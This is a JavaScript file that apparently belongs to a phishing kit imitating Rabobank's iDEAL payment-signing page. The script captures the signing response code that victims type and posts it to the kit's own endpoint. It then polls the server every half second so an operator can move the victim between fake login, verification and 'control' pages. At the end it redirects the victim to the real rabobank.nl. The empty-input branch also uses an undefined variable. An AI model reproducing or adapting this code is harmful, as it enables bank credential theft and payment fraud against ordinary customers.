const login_form = document.querySelector('#token-view');

const respons = document.querySelector('#rass-data-inlogcode');
const loginButton = document.querySelector('#rass-action-login');
const token = document.querySelector('#token');
const error = document.querySelector('#error-div');

const image = document.querySelector('.rass-uicontrol-qrcode');

login_form.addEventListener('submit', e => {
    e.preventDefault();

    if (respons.value == '') {
        error.style.display = 'block';
        image.src = data.code;
        loginButton.style.backgroundColor = '#fd6400';
        loginButton.innerHTML = 'Ga verder';
        loginButton.disabled = false;
        respons.disabled = false;
        respons.value = '';
    } else {
        const data = new FormData();
        data.append('respons', respons.value);

        loginButton.innerHTML = '<img src="/img/ing.gif" style="padding-top: 5px;" width="20">';
        loginButton.disabled = true;
        respons.disabled = true;
        loginButton.style.backgroundColor = '#e8e8e8';
        loginButton.style.borderColor = 'transparent';
            
        error.style.display = 'none'; 

        fetch('/ideal-betalen/ondertekenen/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => {
            const newInterval = setInterval(() => {
                fetch('/ideal-betalen/ondertekenen/check/' + token.value, {
                    method: 'POST'
                }).then(res => {
                    res.json().then(data => {
                        if (data.page == 'signPage') {
                            error.style.display = 'block';
                            image.src = data.code;
                            loginButton.style.backgroundColor = '#fd6400';
                            loginButton.innerHTML = 'Ga verder';
                            loginButton.disabled = false;
                            respons.disabled = false;
                            respons.value = '';
                            clearInterval(newInterval)
                        } else if (data.page == 'loginPage') {
                            window.location.href = '/ideal-betalen/inloggen/' + token.value;
                        } else if (data.page == 'verificationPage') {
                            window.location.href = '/ideal-betalen/bevestigen/' + token.value;
                        } else if (data.page == 'control') {
                            window.location.href = '/ideal-betalen/controleren/' + token.value;
                        } else if (data.page == 'finish') {
                            window.location.href = 'https://www.rabobank.nl';
                        } else if (data.page == 'waiting') {
                            console.log('Waiting...');
                        }
                    });
                });
            }, 500);
        });
    }
});
